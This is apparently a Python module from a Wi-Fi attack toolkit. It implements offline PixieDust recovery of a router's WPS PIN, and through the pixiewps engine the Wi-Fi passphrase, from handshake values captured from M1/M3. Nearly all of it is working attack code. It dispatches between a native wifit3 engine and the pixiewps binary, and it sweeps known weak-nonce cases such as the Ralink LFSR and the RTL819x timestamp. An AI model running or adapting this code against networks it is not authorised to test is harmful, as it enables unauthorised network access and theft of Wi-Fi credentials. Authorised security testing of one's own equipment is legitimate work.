"""Offline PixieDust recovery with two interchangeable engines.

* ``native`` - wifit3's pure-Python ``recover_pin`` (no compiler needed, works
  everywhere wifit3 is importable).  It tries the weak-entropy cases for the
  WPS ``E-S1``/``E-S2`` secret nonces: null secrets, the enrollee nonce reused
  as both secrets, the Ralink/MediaTek LFSR, and (deep) the RTL819x ``glibc``
  timestamp window.
* ``pixiewps`` - the classic C binary (``pixiewps -e ... -s ...``).

Both consume the same six values captured from M1/M3.  ``authkey`` is derived
locally during the live capture, so no ``reaver`` log is needed.
"""

from __future__ import annotations

import time
from dataclasses import dataclass, field

from . import pixiewps, thirdparty, util

# Values needed by the native engine (pixiewps can get away without authkey
# when the AP used --dh-small; recover_pin cannot).
NATIVE_FIELDS = ("pke", "pkr", "e_nonce", "e_hash1", "e_hash2", "authkey")

NATIVE_BYTES = {
    "pke": 192,
    "pkr": 192,
    "e_nonce": 16,
    "e_hash1": 32,
    "e_hash2": 32,
    "authkey": 32,
}

# Human names -> wifit3.PixieMode members.  The fast trio is the default: the
# RTL819x timestamp sweep can take minutes in pure Python, so it is opt-in.
FAST_MODES = ("null", "static", "ralink")
DEEP_MODES = ("null", "static", "ralink", "rtl819x")
ALL_MODES = ("null", "static", "ralink", "rtl819x", "ecos")

_MODE_LABELS = {
    "null": "Null secret (E-S1 = E-S2 = 0)",
    "static": "Static secret (nonce used as E-S1/E-S2)",
    "ralink": "Ralink/MediaTek LFSR",
    "rtl819x": "RTL819x glibc timestamp",
    "ecos": "eCos simple seed sweep",
}


@dataclass
class CrackOutcome:
    pin: str | None = None
    psk: str | None = None
    ssid: str | None = None
    first_half: str | None = None
    mode: str | None = None
    engine: str = "native"
    vulnerable: bool | None = None
    seconds: float = 0.0
    modes_tried: list = field(default_factory=list)
    notes: list = field(default_factory=list)

    @property
    def success(self) -> bool:
        return bool(self.pin)

    def to_dict(self) -> dict:
        return {
            "pin": self.pin,
            "psk": self.psk,
            "ssid": self.ssid,
            "first_half": self.first_half,
            "mode": self.mode,
            "engine": self.engine,
            "success": self.success,
            "vulnerable": self.vulnerable,
            "seconds": round(self.seconds, 3),
            "modes_tried": self.modes_tried,
            "notes": self.notes,
        }


# --------------------------------------------------------------------- modes


def resolve_modes(value: str | None = None, deep: bool = False) -> list:
    """Turn ``--modes null,ralink`` / ``--deep`` into a list of mode names."""
    if value:
        names = [part.strip().lower() for part in value.replace(";", ",").split(",") if part.strip()]
        bad = [name for name in names if name not in ALL_MODES]
        if bad:
            raise util.PixieError(
                f"unknown PixieDust mode(s): {', '.join(bad)}\n"
                f"  choose from: {', '.join(ALL_MODES)}"
            )
        # De-duplicate but keep the order the user gave.
        unique = []
        for name in names:
            if name not in unique:
                unique.append(name)
        if not unique:
            raise util.PixieError("no mode selected (use e.g. --modes null,ralink)")
        return unique
    return list(DEEP_MODES if deep else FAST_MODES)


def mode_label(name: str) -> str:
    return _MODE_LABELS.get(name, name)


# --------------------------------------------------------------- native engine


def native_available() -> bool:
    """True when wifit3's offline PixieDust code can be imported."""
    if thirdparty.find() is None:
        return False
    try:
        thirdparty.ensure_importable()
        from wifit3.campaigns.wps.pixie import PixieMode, recover_pin  # noqa: F401
        return True
    except Exception:  # pragma: no cover - depends on the user's wifit3 install
        return False


def _as_mapping(values) -> dict:
    if isinstance(values, pixiewps.Params):
        return values.to_dict()
    return dict(values or {})


def _native_values(values: dict) -> dict:
    """Validate/normalise the six fields the native engine needs."""
    out = {}
    missing = []
    for name in NATIVE_FIELDS:
        raw = values.get(name)
        if not raw:
            missing.append(name)
            continue
        clean = util.validate_hex(raw if isinstance(raw, str) else raw.hex(), name,
                                  NATIVE_BYTES[name])
        out[name] = bytes.fromhex(clean)
    if missing:
        raise util.PixieError("the native engine needs: " + ", ".join(missing))
    mac = values.get("enrollee_mac") or values.get("bssid")
    if mac:
        try:
            out["enrollee_mac"] = bytes.fromhex(
                util.validate_hex(mac if isinstance(mac, str) else mac.hex(),
                                  "enrollee_mac", 6))
        except util.PixieError:
            pass
    return out


def crack_native(values, modes: list | None = None, ui=None) -> CrackOutcome:
    """Run wifit3's ``recover_pin`` one mode at a time and report progress."""
    if not native_available():
        raise util.PixieError(thirdparty.INSTALL_HINT)

    from wifit3.campaigns.wps.pixie import PixieBundle, PixieMode, recover_pin

    raw = _native_values(_as_mapping(values))
    bundle = PixieBundle(
        pke=raw["pke"],
        pkr=raw["pkr"],
        e_hash1=raw["e_hash1"],
        e_hash2=raw["e_hash2"],
        e_nonce=raw["e_nonce"],
        authkey=raw["authkey"],
        enrollee_mac=raw.get("enrollee_mac"),
    )
    names = list(modes or FAST_MODES)
    enum_for = {
        "null": PixieMode.NULL_SECRET,
        "static": PixieMode.STATIC_SECRET,
        "ralink": PixieMode.RALINK,
        "rtl819x": PixieMode.RTL819X,
        "ecos": PixieMode.ECOS_SIMPLE,
    }

    started = time.perf_counter()
    outcome = CrackOutcome(engine="native")
    for name in names:
        mode = enum_for[name]
        outcome.modes_tried.append(name)
        if ui:
            ui.info(f"trying {mode_label(name)} ...")
        try:
            result = recover_pin(bundle, modes=[mode])
        except (AttributeError, TypeError):
            raise
        except Exception as exc:  # pragma: no cover - defensive
            outcome.notes.append(f"{name}: {exc}")
            continue
        if result.pin is not None:
            outcome.pin = result.pin
            outcome.mode = name
            break
        if result.first_half is not None and outcome.first_half is None:
            outcome.first_half = result.first_half
            outcome.mode = name

    outcome.seconds = time.perf_counter() - started
    if outcome.pin is None and "rtl819x" not in names:
        outcome.notes.append("RTL819x targets need --deep (slower timestamp sweep)")
    return outcome


# ------------------------------------------------------------ pixiewps engine


def crack_pixiewps(values, *, binary=None, timeout: int = 0, ui=None,
                   echo: bool = True) -> CrackOutcome:
    mapping = _as_mapping(values)
    params = values if isinstance(values, pixiewps.Params) else pixiewps.Params.from_mapping(mapping)
    params.normalize()
    started = time.perf_counter()
    result = pixiewps.crack(params, binary=binary, timeout=timeout, ui=ui, echo=echo)
    return CrackOutcome(
        pin=result.pin,
        psk=result.psk,
        ssid=result.ssid,
        engine="pixiewps",
        vulnerable=result.vulnerable,
        seconds=time.perf_counter() - started,
        modes_tried=list(result.modes),
    )


# ------------------------------------------------------------------ dispatch


def crack(values, *, engine: str = "auto", modes: list | None = None,
          binary=None, timeout: int = 0, ui=None, echo: bool = True) -> CrackOutcome:
    """Recover the PIN with the requested engine (``auto`` prefers native)."""
    engine = (engine or "auto").lower()
    if engine not in ("auto", "native", "pixiewps"):
        raise util.PixieError(f"unknown engine '{engine}' (choose auto, native or pixiewps)")

    if engine in ("auto", "native"):
        if native_available():
            mapping = _as_mapping(values)
            complete = all(mapping.get(name) for name in NATIVE_FIELDS)
            if complete or engine == "native":
                return crack_native(mapping, modes=modes, ui=ui)
            # e.g. a pcap needing --dh-small: only pixiewps can derive authkey.
            if ui:
                ui.warn("AuthKey missing - native engine needs it, using pixiewps")
        elif engine == "native":
            raise util.PixieError(thirdparty.INSTALL_HINT)

    return crack_pixiewps(values, binary=binary, timeout=timeout, ui=ui, echo=echo)
